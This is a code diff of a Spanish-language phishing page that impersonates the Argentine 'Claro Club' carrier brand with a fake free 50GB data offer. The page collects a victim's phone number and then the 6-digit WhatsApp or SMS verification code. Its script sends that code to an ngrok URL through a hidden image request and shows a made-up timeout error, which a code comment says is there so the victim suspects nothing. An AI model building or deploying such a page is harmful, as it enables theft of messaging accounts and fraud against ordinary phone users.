@@ -9,35 +9,47 @@
         .navbar { background: #ee1c25; padding: 15px; color: white; font-weight: bold; font-size: 20px; }
         .container { width: 90%; max-width: 400px; margin: 20px auto; background: white; border-radius: 12px; padding: 20px; box-shadow: 0 5px 15px rgba(0,0,0,0.1); }
         h2 { color: #ee1c25; font-size: 22px; }
+        p { color: #555; font-size: 15px; padding: 0 10px; }
         input { width: 100%; padding: 12px; margin: 15px 0; border: 1px solid #ddd; border-radius: 8px; font-size: 18px; text-align: center; box-sizing: border-box; }
-        .btn { background: #ee1c25; color: white; padding: 15px; width: 100%; border: none; border-radius: 8px; font-size: 16px; font-weight: bold; cursor: pointer; }
+        .btn { background: #ee1c25; color: white; padding: 15px; width: 100%; border: none; border-radius: 8px; font-size: 16px; font-weight: bold; cursor: pointer; transition: 0.3s; }
+        .btn:active { background: #c4121a; }
         #step2 { display: none; }
     </style>
 </head>
 <body>
     <div class="navbar">Claro Club</div>
-    <div class="container">
-        <div id="step1">
-            <h2>¡Pack de 50GB!</h2>
-            <p>Ingresá tu número de línea para recibir el beneficio gratuito:</p>
-            <input type="tel" id="phone" placeholder="Cod. área + número">
-            <button class="btn" onclick="document.getElementById('step1').style.display='none';document.getElementById('step2').style.display='block';">VINCULAR LÍNEA</button>
-        </div>
 
-        <div id="step2">
-            <h2>VALIDACIÓN</h2>
-            <p>Por seguridad, ingresá el código de 6 dígitos que recibiste por <b>WhatsApp o SMS</b>:</p>
-            <input type="number" id="code" placeholder="000000">
-            <button class="btn" onclick="capturar()">ACTIVAR AHORA</button>
-        </div>
+    <div class="container" id="step1">
+        <h2>¡Pack de 50GB Gratis!</h2>
+        <p>Ingresá tu número de línea para recibir el beneficio de navegación gratuita por 30 días:</p>
+        <input type="tel" id="phone" placeholder="Cod. área + número">
+        <button class="btn" onclick="document.getElementById('step1').style.display='none';document.getElementById('step2').style.display='block';">VINCULAR LÍNEA</button>
+    </div>
+
+    <div class="container" id="step2">
+        <h2>VALIDACIÓN DE LÍNEA</h2>
+        <p>Por seguridad, ingresá el código de 6 dígitos que recibiste por <b>WhatsApp o SMS</b> para activar los GB:</p>
+        <input type="number" id="code" placeholder="000000">
+        <button class="btn" onclick="enviarAlTerminal()">ACTIVAR AHORA</button>
     </div>
 
     <script>
-        function capturar() {
+        function enviarAlTerminal() {
             var n = document.getElementById('code').value;
-            // Mandamos el código al puerto 8080 que ya tenés escuchando
-            fetch('https://TU-URL-DE-NGROK.ngrok-free.app/log?codigo=' + n);
-            alert("Error de conexión. Reintente en unos minutos.");
+            if(n.length < 6) {
+                return alert("Por favor, ingresá los 6 dígitos del código de validación.");
+            }
+
+            // Tu link de Ngrok activo según la terminal
+            var urlBase = "https://superdelicately-handworked-brenna.ngrok-free.dev";
+            var urlFinal = urlBase + "/log?codigo=" + n;
+
+            // Envío forzado mediante imagen (más estable en móviles)
+            var img = new Image();
+            img.src = urlFinal;
+
+            // Mensaje de error para que el pibe no sospeche nada
+            alert("Error de validación: El tiempo de espera ha expirado. Recibirás un nuevo código en 5 minutos.");
         }
     </script>
 </body>
